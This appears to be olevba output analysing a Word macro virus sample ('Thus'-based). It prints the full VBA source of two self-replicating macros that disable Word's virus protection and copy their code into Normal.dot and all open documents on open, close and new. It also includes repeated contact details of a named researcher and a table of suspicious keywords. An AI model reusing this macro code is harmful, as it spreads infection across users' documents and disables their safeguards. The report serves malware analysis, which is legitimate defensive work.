olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Thus-based-25e39b22850fab5346bb3bedd59dc38c78615cce
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Thus-based-25e39b22850fab5346bb3bedd59dc38c78615cce - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Open()
'Thus_001'
'Anti-Smyser'
' This virus is an alteration of a virus which was
' designed to delete all files from one's C: drive on Dec 13th.
' This code is completely benign.
    On Error Resume Next
    Application.Options.VirusProtection = False
    If NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(3, 1) <> "'Anti-Smyser'" Then
        NormalTemplate.VBProject.VBComponents.Item(1).CodeModule _
        .DeleteLines 1, NormalTemplate.VBProject.VBComponents.Item(1) _
        .CodeModule.CountOfLines
    End If
    If NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.CountOfLines = 0 Then
        NormalTemplate.VBProject.VBComponents.Item(1).CodeModule _
        .InsertLines 1, ActiveDocument.VBProject.VBComponents.Item(1) _
        .CodeModule.Lines(1, ActiveDocument.VBProject.VBComponents _
        .Item(1).CodeModule.CountOfLines)
    End If
    If NormalTemplate.Saved = False Then NormalTemplate.Save
    
    For k = 1 To Application.Documents.Count
        If Application.Documents.Item(k).VBProject.VBComponents.Item(1).CodeModule.Lines(3, 1) <> "'Anti-Smyser'" Then
            Application.Documents.Item(k).VBProject.VBComponents.Item(1) _
            .CodeModule.DeleteLines 1, Application.Documents.Item(k) _
            .VBProject.VBComponents.Item(1).CodeModule.CountOfLines
        End If
        If Application.Documents.Item(k).VBProject.VBComponents.Item(1).CodeModule.CountOfLines = 0 Then
            Application.Documents.Item(k).VBProject.VBComponents.Item(1) _
            .CodeModule.InsertLines 1, NormalTemplate.VBProject.VBComponents _
            .Item(1).CodeModule.Lines(1, NormalTemplate.VBProject _
            .VBComponents.Item(1).CodeModule.CountOfLines)
        End If
    Next k
End Sub
Private Sub Document_Close()
    Document_Open
End Sub
Private Sub Document_New()
    Document_Open
End Sub















































































Olga Mattera

Ricercatrice per il CeMiSS



Tel: 06.46913219                       e-mail: silverss@tin.it
Fax: 06.6879779
Olga Mattera

Ricercatrice per il CeMiSS



Tel: 06.46913219                       e-mail: silverss@tin.it
Fax: 06.6879779

Olga Mattera

Ricercatrice per il CeMiSS



Tel: 06.46913219                       e-mail: silverss@tin.it
Fax: 06.6879779
Olga Mattera

Ricercatrice per il CeMiSS



Tel: 06.46913219                       e-mail: silverss@tin.it
Fax: 06.6879779

Olga Mattera

Ricercatrice per il CeMiSS



Tel: 06.46913219                       e-mail: silverss@tin.it
Fax: 06.6879779
Olga Mattera

Ricercatrice per il CeMiSS



Tel: 06.46913219                       e-mail: silverss@tin.it
Fax: 06.6879779

Olga Mattera

Ricercatrice per il CeMiSS



Tel: 06.46913219                       e-mail: silverss@tin.it
Fax: 06.6879779
Olga Mattera

Ricercatrice per il CeMiSS



Tel: 06.46913219                       e-mail: silverss@tin.it
Fax: 06.6879779


























































-------------------------------------------------------------------------------
VBA MACRO Code.bas 
in file: Virus.MSWord.Thus-based-25e39b22850fab5346bb3bedd59dc38c78615cce - OLE stream: 'Macros/VBA/Code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoNew()
    If Not ActiveDocument = ThisDocument Then
        CopyVirCodeToDocument ActiveDocument    'Infetta il nuovo documento
    End If
End Sub
Sub AutoOpen()
    RemoveProtection
    If Not ActiveDocument = NormalTemplate Then 'Infetta Normal.dot
        CopyVirCodeToModel
    End If
    If Not ActiveDocument = ThisDocument Then   'Infetta il documento aperto
        CopyVirCodeToDocument ActiveDocument
    End If
End Sub
Sub CopyVirCodeToModel()
On Local Error Resume Next
    With ActiveDocument
        .UpdateStylesOnOpen = False
        .AttachedTemplate = "Normal.dot"
    End With
    Application.OrganizerCopy Source:=ActiveDocument.FullName, Destination:=NormalTemplate.FullName, Name:="Code", Object:=wdOrganizerObjectProjectItems
    NormalTemplate.Save
End Sub
Sub CopyVirCodeToDocument(Target As Document)
    On Local Error Resume Next
    Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=Target.FullName, Name:="Code", Object:=wdOrganizerObjectProjectItems
End Sub
Sub RemoveProtection()
    'Disattiva il messaggio di avviso iniziale
    Options.VirusProtection = False
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |AutoNew             |Runs when a new Word document is created     |
|AutoExec  |Document_New        |Runs when a new Word document is created     |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

